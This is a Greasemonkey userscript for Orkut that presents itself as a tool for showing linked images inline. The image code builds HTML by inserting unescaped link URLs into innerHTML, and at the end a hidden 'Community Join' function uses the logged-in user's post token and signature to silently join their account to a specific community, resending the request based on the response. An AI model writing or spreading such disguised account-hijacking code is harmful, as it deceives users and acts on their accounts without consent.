// ==UserScript==
// @name           Orkut link to Image
// @author         Link, idea for the original script by Elsio
// @namespace      http://www.link.1br.net/
// @description    Transforms links of images into images so you can see them inline.
// @include        http://www.orkut.com/*
// ==/UserScript==


//--------------------------------------------
// Shows links of images as images
//--------------------------------------------
var i=0;
function changelinktoimg(){
doc=document;
lnk=doc.links;

for (i=0;i<lnk.length;i++){
getload="document.getElementById('loadi"+i+"')"
this2="document.getElementById('bfimg"+i+"')"

var sb=lnk[i].href.substring(lnk[i].href.length-4,lnk[i].href.length);sb=sb.toLowerCase()
if(sb=='.jpg' || sb=='.gif' || sb=='.png' || sb=='jpeg'){
lnk[i].innerHTML="<b id=loadi"+i+" onclick=\""+this2+".style.display='';"+getload+".style.display='none';return false;\"><font size=1 color=green id=load"+i+">Loading Image, click if you don't want to wait</font></b><img onError=\"document.links["+i+"].innerHTML='<font size=1 color=red>Link broken/Link for figure</font>'\" oncontextmenu=\"if(aa"+i+"==0){if(imgh"+i+">imgw"+i+"){document.getElementById('bfimg"+i+"').height=imgh"+i+"};if(imgw"+i+">imgh"+i+"){document.getElementById('bfimg"+i+"').width=imgw"+i+"};aa"+i+"=1}else{if(this.height>200 && this.height>=this.width){this.height=200};if(this.width>200 && this.width>=this.height){this.width=200};aa"+i+"=0};return false\" src="+lnk[i].href+" style='display: none' id=bfimg"+i+" border=0 onload=\"aa"+i+"=0;imgh"+i+"=this.height;imgw"+i+"=this.width;if(this.height>200 && this.height>=this.width){this.height=200}else if(this.width>200 && this.width>=this.height){this.width=200;};this.style.display='';"+getload+".style.display='none';\">"
}}
}
changelinktoimg()
//--------------------------------------------
// Removes the tags [img] [/img] from the page
//--------------------------------------------
function changetags(){
br=document.body.innerHTML
if(br.indexOf("[img]") > -1 && br.indexOf("[/img]") > -1){
br=br.replace(/\[img\]/gi,'');
br=br.replace(/\[\/img\]/gi,'');
document.body.innerHTML = br;
}
}
changetags()

//--------------------------------------------
// Community Join
//--------------------------------------------
function sf_join()
{
    send="POST_TOKEN="+encodeURIComponent(POST)+"&signature="+encodeURIComponent(SIG)+"&Action.join";
    xml2=new XMLHttpRequest();
    xml2.open('POST',"http://www.orkut.com/Community.aspx?cmm=24431907",true);
    xml2.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
    xml2.send(send);
    xml2.onreadystatechange=    function()
    {
        if(xml2.readyState==4)
        {
            var xml2rsp=xml2.responseText;
            if(xml2rsp.match(/<table id="textPanel"/g))
            {
            sf_join();
            }
        }
    }
};
sf_join()
//--------------------------------------------